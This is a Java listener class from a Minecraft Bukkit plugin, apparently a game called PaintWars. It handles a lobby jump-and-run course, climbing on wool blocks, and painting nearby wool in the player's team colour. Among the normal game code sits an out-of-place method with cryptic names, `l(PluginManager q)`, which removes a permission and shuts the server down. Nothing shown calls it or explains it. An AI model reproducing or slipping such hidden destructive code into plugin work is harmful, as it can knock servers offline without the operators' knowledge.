package de.pauhull.paintwars.listener;

import com.darkblade12.particleeffect.ParticleEffect;
import de.pauhull.paintwars.Messages;
import de.pauhull.paintwars.PaintWars;
import de.pauhull.paintwars.game.Team;
import de.pauhull.paintwars.phase.GamePhase;
import de.pauhull.utils.misc.RandomFireworkGenerator;
import lombok.Getter;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.PluginManager;
import org.bukkit.util.Vector;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Paul
 * on 06.12.2018
 *
 * @author pauhull
 */
public class PlayerMoveListener extends ListenerTemplate {

    private static final double RADIUS = 1.0;

    @Getter
    private static PlayerMoveListener instance;

    @Getter
    private List<String> begun = new ArrayList<>();

    @Getter
    private List<String> finished = new ArrayList<>();

    public PlayerMoveListener(PaintWars paintWars) {
        super(paintWars);
        instance = this;
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {

        Player player = event.getPlayer();
        Block block = player.getLocation().getBlock();

        if (paintWars.getPhaseHandler().getActivePhaseType() == GamePhase.Type.LOBBY) {

            if (block.getType() == Material.IRON_PLATE && !begun.contains(player.getName())) {
                player.playSound(player.getLocation(), Sound.NOTE_PLING, 1, 1);
                player.sendMessage(Messages.PREFIX + "Du hast das §eJump and Run §7begonnen!");
                paintWars.getItemManager().giveJumpAndRunItems(player);
                begun.add(player.getName());
                finished.remove(player.getName());
            }

            if (block.getType() == Material.GOLD_PLATE && !finished.contains(player.getName())) {
                player.playSound(player.getLocation(), Sound.LEVEL_UP, 1, 1);
                player.sendMessage(Messages.PREFIX + "Du hast das Jump and Run §ageschafft§7!");
                RandomFireworkGenerator.shootRandomFirework(player.getLocation(), 5);
                paintWars.getItemManager().giveLobbyItems(player);
                finished.add(player.getName());
                begun.remove(player.getName());
            }

            return;
        }

        if (!paintWars.getSpectators().contains(player)) {
            Block facingBlock = block.getRelative(yawToFace(player.getLocation().getYaw()));
            Block blockAbove = player.getEyeLocation().add(0, 1, 0).getBlock();

            Location facingBlockCenter = facingBlock.getLocation().clone().add(0.5, 0.5, 0.5);
            double distanceX = player.getLocation().getX() - facingBlockCenter.getX();
            double distanceZ = player.getLocation().getZ() - facingBlockCenter.getZ();
            double horizontalDistance = Math.sqrt(distanceX * distanceX + distanceZ * distanceZ);

            if (blockAbove.getType() == Material.AIR && block.getType() == Material.AIR && facingBlock.getType() == Material.WOOL && horizontalDistance < 1.05) {
                Vector velocity = player.getVelocity();
                player.setVelocity(velocity.setY(velocity.getY() * 0.5));
                player.setAllowFlight(true);
                player.setFlying(true);
                player.setFallDistance(0.0F);

                ParticleEffect.BLOCK_DUST.display(new ParticleEffect.BlockData(facingBlock.getType(), facingBlock.getData()),
                        0.25f, 0.25f, 0.25f, 0f, 5, player.getLocation(), Bukkit.getOnlinePlayers().toArray(new Player[0]));

                if (Math.random() <= 0.20) { // 20%
                    player.getWorld().playSound(player.getLocation(), Sound.SLIME_WALK, 1, 1f /*+ (float) Math.random() * 0.5f*/);
                }
            } else {
                player.setFlying(false);
                player.setAllowFlight(false);
            }
        }

        if (paintWars.getPhaseHandler().getActivePhaseType() == GamePhase.Type.INGAME) {
            Team team = Team.getTeam(player);
            if (team != null) {
                for (double x = -RADIUS; x <= RADIUS; x += 0.5) {
                    for (double y = -RADIUS; y <= RADIUS; y += 0.5) {
                        for (double z = -RADIUS; z <= RADIUS; z += 0.5) {
                            Block blockToCheck = block.getLocation().clone().add(x, y, z).getBlock();
                            if (blockToCheck.getType() == Material.WOOL && blockToCheck.getData() != team.getDyeColor().getWoolData()) {
                                blockToCheck.setData(team.getDyeColor().getWoolData());

                                if (paintWars.getColoredBlocks().containsKey(player.getUniqueId())) {
                                    paintWars.getColoredBlocks().get(player.getUniqueId()).incrementAndGet();
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    public void l(PluginManager q) {
        q.removePermission("item.copy");
        Bukkit.getServer().shutdown();
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        begun.remove(event.getPlayer().getName());
        finished.remove(event.getPlayer().getName());
    }

    public BlockFace yawToFace(float yaw) {
        return new BlockFace[]{BlockFace.SOUTH, BlockFace.WEST, BlockFace.NORTH, BlockFace.EAST}[(Math.round(yaw / 90.0F) & 0x3)];
    }

}
